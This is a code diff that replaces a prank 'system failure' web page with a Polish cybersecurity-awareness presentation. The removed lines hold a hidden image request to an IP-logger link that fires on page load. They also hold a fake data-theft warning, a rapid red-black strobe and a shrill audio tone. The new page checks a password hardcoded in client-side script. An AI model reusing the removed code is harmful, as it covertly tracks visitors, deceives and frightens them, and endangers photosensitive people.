@@ -2,123 +2,225 @@
 <html lang="pl">
 <head>
     <meta charset="UTF-8">
-    <title>SYSTEM FAILURE - CRITICAL ERROR</title>
+    <title>PREZENTACJA: Bezpieczeństwo IT</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700;900&display=swap" rel="stylesheet">
     <style>
-        body { 
-            background: black; 
-            color: #00FF41; 
-            font-family: 'Courier New', monospace; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
-            text-align: center; 
-            overflow: hidden; 
-            transition: background 0.1s;
+        :root {
+            --primary: #6366f1;
+            --danger: #ff0000;
+            --bg: #0b0e14;
+            --card-bg: #161b22;
+            --text: #ffffff;
+            --success: #00ff66;
         }
-        .container { 
-            border: 2px solid #00FF41; 
-            padding: 40px; 
-            box-shadow: 0 0 30px rgba(0, 255, 65, 0.3); 
-            z-index: 10;
-            background: rgba(0,0,0,0.95);
-            position: relative;
-        }
-        .warning { color: #ff0000; font-weight: bold; animation: blink 0.5s infinite; font-size: 2.5rem; }
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
 
-        #papiez {
-            position: absolute;
-            width: 180px;
-            z-index: 5;
-            top: 10px;
-            left: 10px;
-            filter: drop-shadow(0 0 15px gold);
+        body {
+            font-family: 'Montserrat', sans-serif;
+            background-color: var(--bg);
+            color: var(--text);
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        /* --- LOGOWANIE --- */
+        #login-screen {
+            background: var(--card-bg);
+            padding: 60px;
+            border-radius: 40px;
+            text-align: center;
+            border: 4px solid var(--primary);
+            box-shadow: 0 0 30px rgba(99, 102, 241, 0.4);
+        }
+
+        h2 { font-weight: 900; font-size: 2.5rem; margin-bottom: 30px; letter-spacing: 2px; }
+
+        input {
+            padding: 20px;
+            width: 300px;
+            border-radius: 15px;
+            border: 3px solid #30363d;
+            background: #000;
+            color: var(--primary);
+            font-size: 1.5rem;
+            text-align: center;
+            margin-bottom: 30px;
+            font-weight: 900;
+            outline: none;
+        }
+
+        .btn-main {
+            background: var(--primary);
+            color: white;
+            padding: 20px 60px;
+            border: none;
+            border-radius: 15px;
+            font-size: 1.5rem;
+            font-weight: 900;
+            cursor: pointer;
+            text-transform: uppercase;
+            box-shadow: 0 10px 0 #3730a3;
+            transition: all 0.2s;
+        }
+
+        .btn-main:hover { transform: translateY(5px); box-shadow: 0 5px 0 #3730a3; background: #818cf8; }
+        .btn-main:active { transform: translateY(10px); box-shadow: 0 0 0 #3730a3; }
+
+        /* --- SIATKA PREZENTACJI --- */
+        #content {
             display: none;
+            width: 95%;
+            max-width: 1300px;
+            padding: 50px 0;
+            animation: slideUp 0.6s ease-out;
         }
 
-        #final-text {
+        @keyframes slideUp { from { opacity: 0; transform: translateY(50px); } to { opacity: 1; transform: translateY(0); } }
+
+        h1 { font-size: 4.5rem; text-align: center; font-weight: 900; margin-bottom: 60px; color: var(--primary); text-shadow: 0 0 20px rgba(99, 102, 241, 0.5); }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+            gap: 25px;
+        }
+
+        .card {
+            background: var(--card-bg);
+            padding: 50px 30px;
+            border-radius: 30px;
+            cursor: pointer;
+            transition: 0.3s;
+            border: 3px solid #30363d;
+            text-align: center;
+        }
+
+        .card:hover {
+            transform: scale(1.03);
+            border-color: var(--primary);
+            box-shadow: 0 0 40px rgba(99, 102, 241, 0.3);
+            background: #1c2128;
+        }
+
+        .card h3 { font-size: 2rem; margin: 0; font-weight: 900; line-height: 1.2; }
+        .card.malware-danger { border-color: var(--danger); background: rgba(255, 0, 0, 0.05); }
+        .card.malware-danger h3 { color: var(--danger); }
+
+        /* --- WIDOK POWIĘKSZONY --- */
+        #modal {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.98);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            padding: 30px;
+        }
+
+        .modal-body {
+            background: white;
+            color: #000;
+            padding: 70px;
+            border-radius: 50px;
+            max-width: 1000px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 0 100px rgba(255,255,255,0.1);
+        }
+
+        #m-title { font-size: 4rem; font-weight: 900; margin-bottom: 25px; text-transform: uppercase; }
+        #m-desc { font-size: 2rem; line-height: 1.4; margin-bottom: 40px; font-weight: 700; color: #1a1a1a; text-align: justify; }
+        
+        .tip-box { 
+            background: #000; 
+            color: var(--success); 
+            padding: 30px; 
+            border-radius: 25px; 
+            font-size: 1.8rem; 
+            font-weight: 900; 
+            border-left: 15px solid var(--danger);
+            text-align: left;
+        }
+
+        .btn-close {
+            margin-top: 40px;
+            background: #000;
+            color: #fff;
+            padding: 15px 40px;
+            border-radius: 10px;
+            font-weight: 900;
+            cursor: pointer;
             display: inline-block;
-            transition: transform 12s linear;
         }
     </style>
 </head>
-<body onclick="startChaos()">
+<body>
 
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/John_Paul_II_vatican_official_portrait.jpg/200px-John_Paul_II_vatican_official_portrait.jpg" id="papiez" alt="JP2">
+    <div id="login-screen">
+        <h2>HASŁO SYSTEMU</h2>
+        <input type="password" id="pass-input" placeholder="********"> <br>
+        <button class="btn-main" onclick="auth()">ODBLOKUJ</button>
+    </div>
 
-    <div class="container">
-        <h1 class="warning">DANE PRZECHWYCONE</h1>
-        <p>Transfer danych do serwera zewnętrznego zakończony sukcesem.</p>
-        <p>Twoje IP oraz hasła zostały zindeksowane.</p>
-        <br>
-        <div id="final-text" style="font-size: 1.8rem; color: #fff;">Życzę chujowej nocy.</div>
-        <p style="font-size: 0.7rem; color: #333; margin-top: 30px;">[ KLIKNIJ ABY ZAMKNĄĆ POWIADOMIENIE ]</p>
+    <div id="content">
+        <h1>STOP CYBER-ATAKOM</h1>
+        <div class="grid" id="main-grid"></div>
+    </div>
+
+    <div id="modal" onclick="closeM()">
+        <div class="modal-body" onclick="event.stopPropagation()">
+            <h2 id="m-title"></h2>
+            <p id="m-desc"></p>
+            <div class="tip-box" id="m-tip"></div>
+            <div class="btn-close" onclick="closeM()">POWRÓT DO LISTY</div>
+        </div>
     </div>
 
     <script>
-        // --- PRZECHWYTYWANIE PRZEZ TWÓJ LINK 2NO.CO ---
-        function triggerLogger() {
-            const logger = new Image();
-            // Przeglądarka "pobiera" link jako obrazek, co aktywuje loggera
-            logger.src = "https://2no.co/2sXYk7?cache=" + Math.random();
+        const data = [
+            { t: "PHISHING", d: "To najpopularniejsza metoda kradzieży. Przestępcy wysyłają tysiące SMS-ów lub maili z linkami do fałszywych paneli płatności. Jeśli tam się zalogujesz, haker natychmiast czyści Twoje konto bankowe.", s: "Sprawdzaj każdy znak w adresie URL strony!" },
+            { t: "SŁABE HASŁA", d: "Atak 'Brute Force' pozwala hakerowi sprawdzić miliardy kombinacji na sekundę. Hasła typu 'Kamil123' są łamane natychmiastowo przez automatyczne skrypty.", s: "Hasło to zdanie, nie słowo. Używaj min. 14 znaków." },
+            { t: "DESTREKCYJNY MALWARE", d: "Pliki .exe (np. MEMZ), które początkowo wyglądają na żart. Wyświetlają piękne animacje, zmieniają kolory pulpitu i puszczają muzykę. W tym samym czasie wirus usuwa System 64, nadpisuje sektor rozruchowy MBR i po restarcie komputer jest tylko kawałkiem złomu.", s: "Nigdy, pod żadnym pozorem nie otwieraj plików .exe z sieci!" },
+            { t: "SOCJOTECHNIKA", d: "To atak na emocje. Oszust dzwoni jako 'pracownik banku' lub 'policjant', wywołując strach i pośpiech. Manipuluje Tobą tak, abyś sam oddał kody BLIK lub zatwierdził przelew.", s: "Rozłącz się i sam zadzwoń na oficjalny numer banku." },
+            { t: "PUBLICZNE WI-FI", d: "Otwarte sieci w galeriach czy pociągach nie są szyfrowane. Haker podłączony do tej samej sieci może widzieć wszystko, co wpisujesz w przeglądarce, w tym hasła i dane kart.", s: "W miejscach publicznych używaj wyłącznie własnego LTE." },
+            { t: "BRAK 2FA", d: "Jeśli używasz tylko hasła, haker ma tylko jedną barierę. Weryfikacja dwuetapowa (2FA) sprawia, że nawet znając hasło, włamywacz nie wejdzie bez kodu z Twojego telefonu.", s: "Włącz weryfikację dwuetapową w każdej aplikacji!" },
+            { t: "FAŁSZYWE SKLEPY", d: "Strony oferujące najnowsze iPhone'y lub buty za ułamek ceny. Takie sklepy istnieją tylko po to, by wyłudzić dane Twojej karty kredytowej (carding) i ukraść pieniądze.", s: "Jeśli cena jest zbyt dobra, by była prawdziwa - to oszustwo." },
+            { t: "OVERSHARING", d: "Udostępnianie zbyt wielu informacji o swoim życiu. Zdjęcie biletu lotniczego, dowodu osobistego czy karta wstępu na siłownię zawiera kody, które haker może wykorzystać do kradzieży tożsamości.", s: "Pomyśl dwa razy, zanim wrzucisz coś do sieci." },
+            { t: "CYBER-STALKING", d: "Długotrwałe nękanie, śledzenie aktywności ofiary i publikowanie ośmieszających materiałów. To cyberprzemoc, która ma na celu zniszczenie psychiki drugiej osoby.", s: "Dokumentuj każdy dowód (screeny) i zgłaszaj to na policję." },
+            { t: "RANSOMWARE", d: "Wirus, który szyfruje wszystkie zdjęcia, filmy i dokumenty na Twoim dysku. Następnie wyświetla komunikat z żądaniem okupu w Bitcoinach. Bez klucza od hakera dane są nieodzyskiwalne.", s: "Rób kopie zapasowe (backup) na dysku offline." }
+        ];
+
+        function auth() {
+            if(document.getElementById('pass-input').value === "2A12k122km") {
+                document.getElementById('login-screen').style.display = 'none';
+                document.getElementById('content').style.display = 'block';
+                const grid = document.getElementById('main-grid');
+                data.forEach((h, i) => {
+                    const isM = h.t.includes("MALWARE");
+                    grid.innerHTML += `
+                        <div class="card ${isM ? 'malware-danger' : ''}" onclick="openM(${i})">
+                            <h3>${i+1}. ${h.t}</h3>
+                            <p style="margin-top:20px; font-weight:bold; color:var(--primary)">ZOBACZ ANALIZĘ →</p>
+                        </div>
+                    `;
+                });
+            } else { alert("ODMOWA DOSTĘPU!"); }
         }
-        
-        // Próba aktywacji przy załadowaniu
-        triggerLogger();
 
-        // --- LATAJĄCY PAPIEŻ ---
-        const papiez = document.getElementById('papiez');
-        const finalText = document.getElementById('final-text');
-        let posX = Math.random() * 100; let posY = Math.random() * 100;
-        let velX = 7; let velY = 5;
-
-        function move() {
-            posX += velX; posY += velY;
-            if (posX + papiez.clientWidth >= window.innerWidth || posX <= 0) velX = -velX;
-            if (posY + papiez.clientHeight >= window.innerHeight || posY <= 0) velY = -velY;
-            papiez.style.left = posX + 'px';
-            papiez.style.top = posY + 'px';
-            requestAnimationFrame(move);
+        function openM(i) {
+            const h = data[i];
+            const title = document.getElementById('m-title');
+            title.innerText = h.t;
+            title.style.color = h.t.includes("MALWARE") ? "red" : "#6366f1";
+            document.getElementById('m-desc').innerText = h.d;
+            document.getElementById('m-tip').innerText = "ŚRODKI OSTROŻNOŚCI: " + h.s;
+            document.getElementById('modal').style.display = 'flex';
         }
 
-        // --- START CHAOSU ---
-        let started = false;
-        function startChaos() {
-            if (started) return;
-            started = true;
-
-            // Dodatkowa próba aktywacji loggera przy kliknięciu (na wszelki wypadek)
-            triggerLogger();
-
-            papiez.style.display = 'block';
-            move();
-
-            // Napis rośnie do gigantycznych rozmiarów
-            finalText.style.transform = "scale(25)";
-
-            // Audio (Pisk)
-            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            const osc = audioCtx.createOscillator();
-            const gain = audioCtx.createGain();
-            osc.type = 'sawtooth'; 
-            osc.frequency.setValueAtTime(4000, audioCtx.currentTime);
-            gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
-            osc.connect(gain);
-            gain.connect(audioCtx.destination);
-            osc.start();
-
-            setInterval(() => {
-                osc.frequency.value = 2500 + Math.random() * 2000;
-            }, 70);
-
-            // Stroboskop (miganie czerwony/czarny)
-            setInterval(() => {
-                document.body.style.background = (document.body.style.background === 'red' ? 'black' : 'red');
-                setTimeout(() => { document.body.style.background = 'black'; }, 50);
-            }, 250);
-        }
+        function closeM() { document.getElementById('modal').style.display = 'none'; }
     </script>
 </body>
 </html>
